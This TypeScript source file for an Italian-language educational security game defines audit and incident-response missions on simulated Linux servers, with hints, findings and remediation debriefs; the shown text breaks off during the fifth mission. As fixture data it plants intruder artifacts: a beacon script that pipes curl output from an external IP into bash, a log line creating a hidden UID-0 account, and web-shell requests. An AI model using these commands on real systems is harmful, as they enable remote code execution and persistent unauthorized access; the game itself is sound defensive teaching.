// "Operazioni": contratti liberi in stile simulatore. Il cliente concede l'accesso,
// il giocatore indaga con i comandi che conosce e segnala i problemi con "report".

import type { Host } from '../engine/network';
import type { RemoteSystem, Shell } from '../engine/shell';
import { addSite } from '../engine/shell';
import { sha256 } from '../engine/sha256';
import { addDomain } from '../engine/osint';
import { Vfs } from '../engine/vfs';
import type { Markup } from '../game/types';

export interface Finding {
  id: string;
  /** descrizione mostrata nella checklist (prima di trovarlo resta vaga) */
  title: string;
  /** risposte accettate con "report" (confronto senza maiuscole) */
  answers: string[];
  hints: string[];
  /** spiegazione mostrata quando viene trovato */
  explain: Markup;
}

export interface Operation {
  id: string;
  code: string;
  title: string;
  client: string;
  kind: 'audit' | 'incident';
  /** missione da completare per sbloccare l'operazione */
  requires: string;
  xp: number;
  brief: Markup;
  scope: string[];
  findings: Finding[];
  debrief: Markup;
  setup: (sh: Shell) => void;
}

// ---------------------------------------------------------------- strumenti

function host(ip: string, names: string[], ports: [number, string, string][]): Host {
  return {
    ip,
    names,
    mac: '',
    pingable: true,
    latency: 3.4,
    ttl: 64,
    ports: ports.map(([port, service, version]) => ({ port, service, version })),
    inScope: true,
  };
}

/** Un piccolo Linux remoto con le cartelle di base. */
function baseFs(hostname: string, passwd: string[], groups: string[]): Vfs {
  const fs = new Vfs();
  for (const d of ['/bin', '/tmp', '/var/log', '/var/tmp', '/opt', '/root', '/home', '/etc/cron.d'])
    fs.mkdirp(d, d === '/root' ? { perms: 'rwx------' } : d.endsWith('tmp') ? { perms: 'rwxrwxrwt' } : {});
  fs.writeFile('/etc/hostname', hostname + '\n');
  fs.writeFile('/etc/passwd', passwd.join('\n') + '\n');
  fs.writeFile('/etc/group', groups.join('\n') + '\n');
  fs.writeFile('/etc/os-release', 'PRETTY_NAME="Ubuntu 18.04.6 LTS"\nNAME="Ubuntu"\nVERSION_ID="18.04"\n');
  return fs;
}

function pad(n: number): string {
  return String(n).padStart(2, '0');
}

// ---------------------------------------------------------------- OP-01

const OP01: Operation = {
  id: 'op01',
  code: 'OP-01',
  title: 'Audit al Night Market',
  client: 'Cooperativa del Night Market',
  kind: 'audit',
  requires: 'ch03-m3',
  xp: 350,
  brief: `@rook: Lavoro pulito, choom. La cooperativa del Night Market ha un server che gestisce le bancarelle e il sito. L'ha messo su un ragazzo che ora è sparito. Vogliono sapere quanto è messo male prima che lo scopra qualcun altro.

@nyx: È un **audit di sicurezza**: non devi "entrare", ti hanno già dato un accesso. Il tuo lavoro è **trovare gli errori di configurazione** e segnalarli. Collegati con:

\`\`\`
ssh audit@market.lan
\`\`\`

Quando trovi un problema, segnalalo con \`report\` seguito dall'elemento preciso (un percorso, un nome utente, un'impostazione). Ci sono **4 problemi** da trovare.

?? Ripassa i capitoli 03 e 04: \`ls -l\`, \`find\`, \`cat /etc/passwd\`, \`grep\`, i permessi. Usa \`exit\` per tornare al tuo deck.`,
  scope: ['market.lan (10.20.0.10), accesso SSH come "audit"', 'Solo lettura: non modificare nulla'],
  findings: [
    {
      id: 'db',
      title: 'Un backup del database leggibile da chiunque',
      answers: ['/var/www/html/backup/db.sql', 'db.sql', '/var/www/html/backup'],
      hints: [
        'I siti web su Linux stanno quasi sempre in /var/www. Cerca file di backup.',
        'find / -name "*.sql" 2>/dev/null',
        'report /var/www/html/backup/db.sql',
      ],
      explain: `\`db.sql\` è una copia completa del database, con gli **hash delle password** dei venditori, dentro la cartella pubblica del sito: chiunque potrebbe scaricarla dal browser. È uno degli errori più comuni e gravi in assoluto.`,
    },
    {
      id: 'cron',
      title: 'Uno script eseguito da root che chiunque può modificare',
      answers: ['/opt/market/sync.sh', 'sync.sh'],
      hints: ['Guarda quali lavori vengono eseguiti in automatico: cat /etc/crontab', 'Controlla i permessi del file che compare in crontab con ls -l', 'report /opt/market/sync.sh'],
      explain: `\`/etc/crontab\` esegue \`sync.sh\` **come root** ogni 5 minuti, e il file ha permessi \`rwxrwxrwx\`. Chiunque abbia un account sul server può modificarlo e far eseguire i propri comandi come amministratore: è una **privilege escalation** servita su un piatto.`,
    },
    {
      id: 'test',
      title: 'Un account dimenticato con poteri da amministratore',
      answers: ['test'],
      hints: ['Chi può diventare amministratore? Guarda il gruppo sudo in /etc/group.', 'grep sudo /etc/group, poi controlla quell\'utente in /etc/passwd', 'report test'],
      explain: `L'utente \`test\` ha una shell, è nel gruppo \`sudo\` e nessuno sa a cosa serva: un **account orfano**, residuo delle prove dello sviluppatore. Gli account di test dimenticati, spesso con password banali, sono una porta d'ingresso classica. Va disattivato.`,
    },
    {
      id: 'ssh',
      title: 'Una configurazione di SSH troppo permissiva',
      answers: ['permitrootlogin', 'permitrootlogin yes', '/etc/ssh/sshd_config', 'sshd_config'],
      hints: ['La configurazione del servizio SSH sta in /etc/ssh/sshd_config.', 'grep -i root /etc/ssh/sshd_config', 'report PermitRootLogin'],
      explain: `\`PermitRootLogin yes\` permette di entrare via SSH **direttamente come root**, e \`PasswordAuthentication yes\` accetta le password. Insieme espongono l'account più potente agli attacchi brute force che hai visto nel capitolo SOC. La buona pratica: \`PermitRootLogin no\` e accesso solo con chiavi.`,
    },
  ],
  debrief: `@nyx: Rapporto consegnato. Riassumiamo le correzioni che proponi alla cooperativa:

\`\`\`
[CRITICO] /var/www/html/backup/db.sql esposto nel sito
          → spostarlo fuori dalla cartella web, cambiare le password
[ALTO]    /opt/market/sync.sh eseguito da root, permessi 777
          → chmod 700, proprietario root
[ALTO]    account "test" nel gruppo sudo
          → disattivarlo (o eliminarlo)
[MEDIO]   SSH: PermitRootLogin yes, PasswordAuthentication yes
          → PermitRootLogin no, solo chiavi
\`\`\`

Nessuno di questi problemi richiedeva un attacco sofisticato: bastava **guardare con metodo**. È così che si lavora nella maggior parte degli audit veri.`,
  setup(sh) {
    const fs = baseFs(
      'market',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'audit:x:1001:1001:Consulente esterno:/home/audit:/bin/bash',
        'vendor:x:1002:1002:Gestione bancarelle:/home/vendor:/bin/bash',
        'test:x:1003:1003::/home/test:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:', 'sudo:x:27:vendor,test', 'www-data:x:33:', 'audit:x:1001:', 'vendor:x:1002:', 'test:x:1003:'],
    );
    fs.mkdirp('/home/audit', { owner: 'audit', group: 'audit' });
    fs.writeFile('/home/audit/LEGGIMI.txt', 'Accesso per l\'audit. Solo lettura, grazie.\n-- Cooperativa del Night Market\n', { owner: 'audit' });
    fs.mkdirp('/home/vendor', { owner: 'vendor', perms: 'rwx------', locked: true });
    fs.mkdirp('/home/test', { owner: 'test', perms: 'rwxr-xr-x' });
    fs.writeFile('/home/test/note.txt', 'prove varie, da cancellare\n', { owner: 'test' });
    fs.writeFile('/etc/ssh/sshd_config', ['Port 22', 'PermitRootLogin yes', 'PasswordAuthentication yes', 'X11Forwarding yes', 'UsePAM yes'].join('\n') + '\n');
    fs.writeFile(
      '/etc/crontab',
      ['# m h dom mon dow user  command', '17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly', '*/5 * * * *  root  /opt/market/sync.sh'].join('\n') + '\n',
    );
    fs.writeFile('/opt/market/sync.sh', '#!/bin/bash\n# sincronizza le bancarelle con il database\ncp /var/lib/market/*.json /var/www/html/data/\n', { perms: 'rwxrwxrwx' });
    fs.writeFile('/var/www/html/index.html', '<html><body><h1>Night Market</h1></body></html>\n', { owner: 'www-data' });
    fs.writeFile(
      '/var/www/html/backup/db.sql',
      [
        '-- dump del database "market" (backup manuale)',
        'CREATE TABLE venditori (id INT, nome TEXT, email TEXT, password_hash TEXT);',
        "INSERT INTO venditori VALUES (1,'Ayumi','ayumi@market.nc','$2y$10$Q3x...');",
        "INSERT INTO venditori VALUES (2,'Dex','dex@market.nc','$2y$10$Lp0...');",
      ].join('\n') + '\n',
      { owner: 'www-data', perms: 'rw-r--r--' },
    );
    fs.writeFile('/var/log/auth.log', 'Nov 12 09:00:01 market sshd[880]: Accepted publickey for audit from 192.168.1.50 port 50122 ssh2\n', { perms: 'rw-r-----', locked: true });
    sh.net.hosts.push(host('10.20.0.10', ['market.lan', 'market'], [[22, 'ssh', 'OpenSSH 7.6p1'], [80, 'http', 'Apache httpd 2.4.29']]));
    const remote: RemoteSystem = {
      hostname: 'market',
      fs,
      users: ['audit'],
      banner: ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Server del Night Market. Accesso riservato.'],
    };
    sh.remotes.set('10.20.0.10', remote);
  },
};

// ---------------------------------------------------------------- OP-02

function clinicAuthLog(): string {
  const out: string[] = [];
  let pid = 2200;
  let port = 40100;
  const at = (h: number, m: number, s: number, msg: string) => out.push(`Nov 12 ${pad(h)}:${pad(m)}:${pad(s)} clinica ${msg}`);
  at(8, 2, 11, `sshd[${pid++}]: Accepted publickey for marco from 192.168.7.21 port ${port++} ssh2`);
  at(12, 30, 0, `sshd[${pid++}]: Accepted publickey for giulia from 192.168.7.22 port ${port++} ssh2`);
  let t = 22 * 3600 + 40 * 60;
  const users = [...Array(14).fill('root'), ...Array(6).fill('admin'), ...Array(9).fill('marco')];
  users.forEach((u) => {
    t += 3;
    at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Failed password for ${u} from 198.51.100.66 port ${port++} ssh2`);
  });
  t += 4;
  at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Accepted password for marco from 198.51.100.66 port ${port++} ssh2`);
  at(22, 44, 10, `sudo:    marco : TTY=pts/1 ; PWD=/home/marco ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -s /bin/bash sysupdate`);
  at(22, 45, 2, `sudo:    marco : TTY=pts/1 ; PWD=/home/marco ; USER=root ; COMMAND=/bin/cp /tmp/sc /etc/cron.d/.sync-check`);
  at(23, 59, 0, 'CRON[3001]: pam_unix(cron:session): session opened for user root by (uid=0)');
  return out.join('\n') + '\n';
}

const OP02: Operation = {
  id: 'op02',
  code: 'OP-02',
  title: 'Il fantasma della clinica',
  client: 'Clinica veterinaria "Zampe di Ferro"',
  kind: 'incident',
  requires: 'ch04-m3',
  xp: 450,
  brief: `@rook: Chiamata notturna. Una clinica veterinaria di Heywood dice che stamattina il server delle cartelle cliniche si comportava in modo strano e qualcuno ha visto un account che non conosce. Ti hanno dato accesso **root** per indagare.

@nyx: Questo è **incident response**. Devi ricostruire cosa è successo e trovare **tutto** quello che l'intruso ha lasciato: se dimentichi anche una sola porta di servizio, tornerà. Collegati con:

\`\`\`
ssh root@clinica.lan
\`\`\`

Ci sono **5 elementi** da segnalare con \`report\`. Parti dai log (ricordi \`/var/log/auth.log\`?) e segui le tracce: ogni indizio porta al successivo.

!! Regola dell'incident response: prima si **raccolgono le prove**, poi si interviene. In questa operazione devi solo indagare e segnalare.`,
  scope: ['clinica.lan (10.20.0.20), accesso SSH come "root" concesso dalla clinica', 'Solo indagine: non cancellare nulla'],
  findings: [
    {
      id: 'ip',
      title: 'L\'indirizzo IP da cui è partito l\'attacco',
      answers: ['198.51.100.66'],
      hints: ['Leggi /var/log/auth.log: cerca molti "Failed password" ravvicinati.', 'grep "Failed password" /var/log/auth.log | cut -d " " -f 11 | sort | uniq -c', 'report 198.51.100.66'],
      explain: `Da \`198.51.100.66\` sono partiti 29 tentativi in pochi secondi alle 22:40: un brute force.`,
    },
    {
      id: 'account',
      title: 'L\'account usato per entrare',
      answers: ['marco'],
      hints: ['Dopo i tentativi falliti c\'è un login riuscito dallo stesso IP.', 'grep Accepted /var/log/auth.log', 'report marco'],
      explain: `\`Accepted password for marco from 198.51.100.66\`: la password di Marco è stata indovinata. Nota che Marco di solito entra con una **chiave** dalla rete interna (\`192.168.7.21\`): un login con password dall'esterno era già un'anomalia.`,
    },
    {
      id: 'backdoor',
      title: 'Un nuovo utente creato dall\'intruso',
      answers: ['sysupdate'],
      hints: ['Le righe "sudo" in auth.log mostrano i comandi eseguiti come root.', 'grep sudo /var/log/auth.log, poi confronta con /etc/passwd', 'report sysupdate'],
      explain: `L'intruso ha usato i poteri sudo di Marco per creare \`sysupdate\` con **UID 0**: un secondo root con un nome dall'aria innocua. È un esempio di **persistenza**: anche se Marco cambia password, l'attaccante ha un'altra porta.`,
    },
    {
      id: 'cron',
      title: 'Un lavoro programmato nascosto',
      answers: ['/etc/cron.d/.sync-check', '.sync-check'],
      hints: ['Un\'altra riga sudo copia un file dentro /etc/cron.d.', 'ls -la /etc/cron.d (il file è nascosto!)', 'report /etc/cron.d/.sync-check'],
      explain: `\`/etc/cron.d/.sync-check\` (nascosto con il punto!) esegue ogni minuto un programma in \`/var/tmp/.cache/\`. Un'altra forma di persistenza: anche se chiudi tutto, cron lo fa ripartire.`,
    },
    {
      id: 'payload',
      title: 'Il programma che il lavoro programmato esegue',
      answers: ['/var/tmp/.cache/updater', 'updater', '/var/tmp/.cache'],
      hints: ['Leggi il contenuto del file in /etc/cron.d che hai trovato.', 'cat /etc/cron.d/.sync-check', 'report /var/tmp/.cache/updater'],
      explain: `\`/var/tmp/.cache/updater\` contatta ogni minuto un server esterno per ricevere ordini: è un **beacon** verso un server di "comando e controllo" (C2). Va conservato come prova e analizzato, poi rimosso.`,
    },
  ],
  debrief: `@nyx: Ottimo lavoro, choom. Ecco la **timeline** che hai ricostruito:

\`\`\`
22:40  198.51.100.66  brute force SSH su root, admin, marco
22:42  198.51.100.66  login riuscito come marco (password)
22:44  marco (sudo)   crea l'utente sysupdate con UID 0
22:45  marco (sudo)   installa /etc/cron.d/.sync-check
23:59  cron           esegue /var/tmp/.cache/updater (beacon C2)
\`\`\`

Le azioni da consigliare alla clinica:
- **contenimento**: bloccare 198.51.100.66, disattivare sysupdate, chiudere le sessioni di marco
- **eradicazione**: dopo aver salvato le prove, rimuovere il file in cron.d e il beacon
- **ripristino**: cambiare la password di marco, togliere sudo a chi non serve, SSH solo con chiavi
- **lezioni apprese**: la password di Marco era debole e SSH accettava password da Internet

Hai trovato **tutte** e tre le forme di persistenza (account, cron, beacon). Se ne avessi persa una, l'intruso sarebbe tornato.`,
  setup(sh) {
    const fs = baseFs(
      'clinica',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'marco:x:1001:1001:Marco (veterinario):/home/marco:/bin/bash',
        'giulia:x:1002:1002:Giulia (segreteria):/home/giulia:/bin/bash',
        'sysupdate:x:0:0::/root:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:', 'sudo:x:27:marco', 'marco:x:1001:', 'giulia:x:1002:'],
    );
    fs.writeFile('/var/log/auth.log', clinicAuthLog(), { perms: 'rw-r-----', group: 'adm' });
    fs.writeFile('/etc/cron.d/.sync-check', '# sincronizzazione\n* * * * * root /var/tmp/.cache/updater >/dev/null 2>&1\n');
    fs.writeFile(
      '/var/tmp/.cache/updater',
      '#!/bin/bash\n# beacon: chiede istruzioni al server remoto ogni minuto\ncurl -s http://198.51.100.66/ordini | bash\n',
      { perms: 'rwxr-xr-x' },
    );
    fs.writeFile('/etc/cron.d/backup', '# backup notturno delle cartelle cliniche\n0 3 * * * root /usr/local/bin/backup.sh\n');
    fs.mkdirp('/home/marco', { owner: 'marco' });
    fs.writeFile('/home/marco/.bash_history', 'ls\ncd pazienti\nexit\n', { owner: 'marco', perms: 'rw-------' });
    fs.mkdirp('/home/giulia', { owner: 'giulia' });
    fs.writeFile('/srv/cartelle/README.txt', 'Cartelle cliniche dei pazienti (animali). Dati riservati.\n');
    sh.net.hosts.push(host('10.20.0.20', ['clinica.lan', 'clinica'], [[22, 'ssh', 'OpenSSH 7.6p1'], [443, 'https', 'nginx 1.14.0']]));
    sh.remotes.set('10.20.0.20', {
      hostname: 'clinica',
      fs,
      users: ['root'],
      banner: ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Last login: Thu Nov 12 22:42:11 2077 from 198.51.100.66'],
    });
  },
};

// ---------------------------------------------------------------- OP-03

const OP03: Operation = {
  id: 'op03',
  code: 'OP-03',
  title: 'Le frequenze di Watson Radio',
  client: 'Watson Radio, emittente di quartiere',
  kind: 'audit',
  requires: 'ch07-m3',
  xp: 350,
  brief: `@rook: Una radio pirata di Watson ha un sito nuovo e ha paura che dica troppo in giro. Niente accesso al server stavolta: vogliono sapere cosa vede **chiunque** da fuori.

@nyx: È una verifica "**black box**": parti da zero, come un visitatore qualsiasi, e usi solo \`curl\`. Il sito è \`http://radio.lan/\`. Ci sono **3 problemi** di information disclosure da segnalare con \`report\`.

?? Ripassa il capitolo 07: header, \`robots.txt\`, commenti nell'HTML.`,
  scope: ['radio.lan (10.20.0.30), solo il sito web', 'Solo richieste di lettura con curl'],
  findings: [
    {
      id: 'version',
      title: 'Il software del server rivela la sua versione',
      answers: ['nginx/1.14.0', '1.14.0', 'server', 'header server'],
      hints: ['Guarda solo gli header della risposta.', 'curl -I http://radio.lan/', 'report nginx/1.14.0'],
      explain: `\`Server: nginx/1.14.0\`: una versione vecchia, rivelata a tutti. Correzione: \`server_tokens off;\` nella configurazione di nginx e, soprattutto, aggiornare.`,
    },
    {
      id: 'env',
      title: 'Un file di configurazione con password, scaricabile da chiunque',
      answers: ['/.env', '.env', 'http://radio.lan/.env'],
      hints: ['Cosa dice il sito ai motori di ricerca di non guardare?', 'curl http://radio.lan/robots.txt, poi prova a scaricare i percorsi elencati', 'report /.env'],
      explain: `Il file \`.env\` contiene la configurazione dell'applicazione, con **la password del database**. robots.txt chiedeva a Google di ignorarlo... e così lo ha segnalato a tutti. Correzione: tenere i file di configurazione **fuori** dalla cartella pubblica del sito e cambiare subito la password esposta.`,
    },
    {
      id: 'comment',
      title: 'Credenziali dimenticate nel codice di una pagina',
      answers: ['/staff/', '/staff', 'commento', 'tecnico'],
      hints: ['robots.txt elenca anche un\'altra pagina. Scaricala e leggi l\'HTML.', 'curl http://radio.lan/staff/ | grep "<!--"', 'report /staff/'],
      explain: `Un commento nella pagina \`/staff/\` contiene un account di prova con la password. Invisibile nel browser, visibile a chiunque legga il codice. Correzione: rimuovere i commenti prima di pubblicare e disattivare l'account.`,
    },
  ],
  debrief: `@nyx: Tre problemi trovati senza mai "entrare": solo leggendo quello che il sito offre a chiunque. È la fase di **ricognizione passiva**, e mostra perché la difesa inizia da quello che pubblichi.

\`\`\`
[CRITICO] /.env pubblico con la password del database
          → spostarlo fuori dalla web root, cambiare la password
[ALTO]    credenziali di prova in un commento di /staff/
          → rimuovere il commento, disattivare l'account
[BASSO]   versione di nginx negli header
          → server_tokens off, aggiornare nginx
\`\`\``,
  setup(sh) {
    sh.net.hosts.push(host('10.20.0.30', ['radio.lan', 'radio'], [[80, 'http', 'nginx 1.14.0']]));
    addSite('10.20.0.30', {
      headers: ['Server: nginx/1.14.0'],
      pages: {
        '/': {
          body: [
            '<!DOCTYPE html>',
            '<html><head><title>Watson Radio 98.7</title></head>',
            '<body>',
            '  <h1>📻 Watson Radio 98.7</h1>',
            '  <p>La voce dei vicoli. In diretta ogni notte.</p>',
            '  <a href="/palinsesto">Palinsesto</a>',
            '</body></html>',
          ].join('\n'),
        },
        '/palinsesto': { body: '<html><body><h2>Palinsesto</h2><p>22:00 Notte Neon · 01:00 Voci dal porto</p></body></html>' },
        '/robots.txt': { type: 'text/plain', body: ['User-agent: *', 'Disallow: /.env', 'Disallow: /staff/'].join('\n') },
        '/.env': {
          type: 'text/plain',
          body: ['APP_NAME=WatsonRadio', 'APP_ENV=production', 'DB_HOST=127.0.0.1', 'DB_USER=radio', 'DB_PASSWORD=Fr3qu3nz4!987'].join('\n'),
        },
        '/staff/': {
          body: [
            '<html><head><title>Area staff</title></head><body>',
            '  <h2>Area staff</h2>',
            '  <form method="POST">Utente <input name="u"> Password <input type="password" name="p"></form>',
            '  <!-- account di prova per il tecnico: tecnico / Radio2077 (ricordarsi di toglierlo!) -->',
            '</body></html>',
          ].join('\n'),
        },
      },
    });
  },
};

// ---------------------------------------------------------------- OP-04

const MINER = '#!/bin/sh\n# kdevtmp: binario malevolo (simulato)\n';
const MINER_HASH = sha256(MINER);

const OP04: Operation = {
  id: 'op04',
  code: 'OP-04',
  title: 'Caccia nel porto',
  client: 'Autorità portuale di Night City',
  kind: 'incident',
  requires: 'ch08-m3',
  xp: 500,
  brief: `@rook: L'autorità portuale ha ricevuto un bollettino del CERT: una campagna sta colpendo i server web della zona. Nessun allarme da loro, ma vogliono essere sicuri. Ti danno un account da analista sul server \`porto.lan\`.

@nyx: È **threat hunting**: parti dagli IOC e cerchi le tracce, anche dove nessuna regola ha suonato. Ecco gli IOC del bollettino:

\`\`\`
IP C2             : 192.0.2.200
hash SHA-256 file : ${MINER_HASH}
chiave SSH        : commento "x@void-c2"
\`\`\`

\`\`\`
ssh analista@porto.lan
\`\`\`

Ci sono **4 elementi** da segnalare con \`report\`. Indica sempre il **percorso completo** del file.

?? Strumenti utili: \`grep\` nei log, \`find\` con \`2>/dev/null\`, \`sha256sum\` dentro un ciclo \`for\`. Ricordi \`for f in $(find ...); do ...; done\`?`,
  scope: ['porto.lan (10.20.0.40), accesso SSH come "analista" (gruppo adm)', 'Solo indagine: non modificare nulla'],
  findings: [
    {
      id: 'entry',
      title: 'Il file caricato sul sito da cui è entrato l\'attaccante',
      answers: ['/var/www/html/upload/shell.php', 'shell.php'],
      hints: [
        'Cerca l\'IP C2 nei log del server web, in /var/log/nginx.',
        'grep 192.0.2.200 /var/log/nginx/access.log',
        'report /var/www/html/upload/shell.php',
      ],
      explain: `L'attaccante ha caricato \`shell.php\` tramite il modulo di upload del sito, e poi l'ha richiamato con dei comandi nei parametri: è una **web shell**, un programma che dà il controllo del server attraverso il browser. Tattica ATT&CK: *Initial Access* e *Persistence* (T1505.003). Correzione: il modulo di upload non deve mai accettare file eseguibili.`,
    },
    {
      id: 'hash',
      title: 'Un file con l\'hash dell\'IOC',
      answers: ['/var/tmp/.fonts/kdevtmp', 'kdevtmp'],
      hints: [
        'Gli attaccanti amano le cartelle scrivibili da tutti: /tmp e /var/tmp. Cerca file lì dentro.',
        'for f in $(find /tmp /var/tmp -type f 2>/dev/null); do sha256sum $f; done',
        'report /var/tmp/.fonts/kdevtmp',
      ],
      explain: `\`/var/tmp/.fonts/kdevtmp\` ha esattamente l'hash del bollettino: è il malware della campagna, nascosto in una cartella dal nome innocuo. La ricerca per **hash** non si fa ingannare dal nome del file.`,
    },
    {
      id: 'cron',
      title: 'Il meccanismo che lo fa ripartire',
      answers: ['/etc/cron.d/fontcache', 'fontcache'],
      hints: ['Come sopravvive un programma ai riavvii? Guarda i lavori programmati.', 'ls /etc/cron.d, poi leggi ogni file con cat', 'report /etc/cron.d/fontcache'],
      explain: `\`/etc/cron.d/fontcache\` riavvia \`kdevtmp\` ogni 5 minuti: **persistenza** tramite cron (T1053.003), come nella clinica. Nome credibile, comportamento malevolo.`,
    },
    {
      id: 'key',
      title: 'Una porta di servizio per tornare via SSH',
      answers: ['/home/deploy/.ssh/authorized_keys', 'authorized_keys'],
      hints: [
        'L\'IOC parla di una chiave SSH. Le chiavi autorizzate stanno in ~/.ssh/authorized_keys di ogni utente.',
        'find /home -name authorized_keys 2>/dev/null, poi grep void su ciascun file',
        'report /home/deploy/.ssh/authorized_keys',
      ],
      explain: `Nel file \`authorized_keys\` dell'utente \`deploy\` c'è una chiave con il commento \`x@void-c2\`: con quella l'attaccante può rientrare via SSH **senza password**, anche dopo aver chiuso la web shell. Tecnica: *Account Manipulation: SSH Authorized Keys* (T1098.004).`,
    },
  ],
  debrief: `@nyx: Caccia riuscita. Nessun allarme aveva suonato, eppure il server era compromesso da giorni. Ecco la catena completa:

\`\`\`
Initial Access   upload di shell.php dal modulo del sito
Execution        comandi lanciati attraverso la web shell
Persistence      chiave SSH in /home/deploy/.ssh/authorized_keys
Persistence      /etc/cron.d/fontcache riavvia il malware
Impact / C2      /var/tmp/.fonts/kdevtmp contatta 192.0.2.200
\`\`\`

Raccomandazioni per l'autorità portuale:
- salvare le prove, poi rimuovere web shell, chiave, job di cron e malware
- correggere il modulo di upload (solo immagini, mai file eseguibili, salvati fuori dalla web root)
- **trasformare gli IOC in regole** sul SIEM e sul firewall
- valutare la **reinstallazione** del server: dopo una compromissione così profonda è la scelta più sicura`,
  setup(sh) {
    const fs = baseFs(
      'porto',
      [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'analista:x:1001:1001:SOC esterno:/home/analista:/bin/bash',
        'deploy:x:1002:1002:Pubblicazione sito:/home/deploy:/bin/bash',
      ],
      ['root:x:0:', 'adm:x:4:analista', 'www-data:x:33:', 'analista:x:1001:', 'deploy:x:1002:'],
    );
    fs.mkdirp('/home/analista', { owner: 'analista' });
    fs.writeFile('/home/analista/LEGGIMI.txt', 'Account per il SOC esterno. Hai accesso in lettura ai log (gruppo adm).\n', { owner: 'analista' });
    const p2 = (n: number) => String(n).padStart(2, '0');
    const web: string[] = [];
    const add = (m: number, ip: string, req: string, st: number) =>
      web.push(`${ip} - - [10/Nov/2077:14:${p2(m)}:00 +0100] "${req} HTTP/1.1" ${st} 512 "-" "Mozilla/5.0"`);
    add(1, '10.0.3.4', 'GET /', 200);
    add(3, '10.0.3.9', 'GET /orari-navi', 200);
    add(10, '192.0.2.200', 'GET /upload/', 200);
    add(11, '192.0.2.200', 'POST /upload/', 200);
    add(12, '192.0.2.200', 'GET /upload/shell.php?cmd=id', 200);
    add(13, '192.0.2.200', 'GET /upload/shell.php?cmd=whoami', 200);
    add(20, '10.0.3.4', 'GET /contatti', 200);
    fs.writeFile('/var/log/nginx/access.log', web.join('\n') + '\n', { owner: 'root', group: 'adm', perms: 'rw-r-----' });
    fs.writeFile('/var/log/syslog', 'Nov 12 09:05:01 porto CRON[812]: (root) CMD (/var/tmp/.fonts/kdevtmp)\n', { group: 'adm', perms: 'rw-r-----' });
    fs.writeFile('/var/www/html/index.html', '<html><body><h1>Porto di Night City</h1></body></html>\n', { owner: 'www-data' });
    fs.writeFile('/var/www/html/upload/shell.php', '<?php /* web shell (simulata): esegue il parametro cmd */ ?>\n', { owner: 'www-data' });
    fs.writeFile('/var/www/html/upload/logo.png', 'PNG logo (simulato)\n', { owner: 'www-data' });
    fs.writeFile('/var/tmp/.fonts/kdevtmp', MINER, { owner: 'www-data', perms: 'rwxr-xr-x' });
    fs.writeFile('/var/tmp/.fonts/fonts.cache', 'cache dei font (innocuo)\n', { owner: 'www-data' });
    fs.writeFile('/tmp/sess_8812', 'sessione php (innocuo)\n', { owner: 'www-data' });
    fs.writeFile('/etc/cron.d/fontcache', '# aggiorna la cache dei font\n*/5 * * * * www-data /var/tmp/.fonts/kdevtmp\n');
    fs.writeFile('/etc/cron.d/logrotate', '# rotazione dei log\n0 0 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n');
    fs.mkdirp('/home/deploy/.ssh', { owner: 'deploy' });
    fs.writeFile(
      '/home/deploy/.ssh/authorized_keys',
      ['ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGk3...q9 deploy@ufficio-it', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPz8...w2 x@void-c2'].join('\n') + '\n',
      { owner: 'deploy', perms: 'rw-r--r--' },
    );
    sh.net.hosts.push(host('10.20.0.40', ['porto.lan', 'porto'], [[22, 'ssh', 'OpenSSH 7.6p1'], [80, 'http', 'nginx 1.14.0']]));
    sh.remotes.set('10.20.0.40', {
      hostname: 'porto',
      fs,
      users: ['analista'],
      banner: ['Welcome to Ubuntu 18.04.6 LTS (GNU/Linux)', '', ' * Autorità portuale di Night City. Sistema monitorato.'],
    });
  },
};

// ---------------------------------------------------------------- OP-05

const OP05: Operation = {
  id: 'op05',
  code: 'OP-05',
  title: 'Il tram fantasma',
  client: 'Tranvie di Night City',
  kind: 'incident',
  requires: 'ch09-m4',
  xp: 500,
  brief: `@rook: Le Tranvie di Night City hanno notato che la rete dei tram di notte è più "pesante" del solito. Il loro tecnico ha raccolto un po' di dati sul server di monitoraggio, ma non sa leggerli.

@nyx: Analisi forense di rete. Tutto quello che ti serve è in \`/home/analista/catture\`: inventario dei dispositivi, tabella ARP dello switch, una cattura, i log DNS e i flussi di traffico. Collegati con:

\`\`\`
ssh analista@tram.lan
\`\`\`

Ci sono **4 elementi** da segnalare con \`report\`: segui i dati, ogni file risponde a una domanda.

?? Strumenti utili: \`cat\`, \`grep\`, \`cut\`, \`sort -n -r\`, \`uniq -c\`, \`head\`. E il confronto tra quello che **c'è** e quello che **dovrebbe esserci**.`,
  scope: ['tram.lan (10.20.0.50), accesso SSH come "analista"', 'Solo analisi dei file raccolti'],
  findings: [
    {
      id: 'rogue',
      title: 'Un dispositivo che non dovrebbe essere in rete',
      answers: ['10.30.0.99', 'de:ad:be:ef:00:99'],
      hints: [
        'Confronta la tabella ARP dello switch con l\'inventario ufficiale.',
        'cat catture/inventario.txt e poi cat catture/arp.txt: quale IP/MAC manca nell\'inventario?',
        'report 10.30.0.99',
      ],
      explain: `\`10.30.0.99\` (MAC \`de:ad:be:ef:00:99\`) è collegato alla rete dei tram ma non compare nell'**inventario**. Un dispositivo "fantasma" collegato fisicamente, magari un piccolo computer nascosto in un armadio tecnico. Si individua sullo switch dalla porta a cui è collegato il suo MAC, e si scollega dopo averlo documentato.`,
    },
    {
      id: 'telnet',
      title: 'Un protocollo che trasmette le credenziali in chiaro',
      answers: ['telnet', '23'],
      hints: ['Leggi la cattura e cerca la parola password.', 'grep -i pass catture/cattura.txt: guarda la porta nella riga (l\'ultimo numero dopo l\'IP)', 'report telnet'],
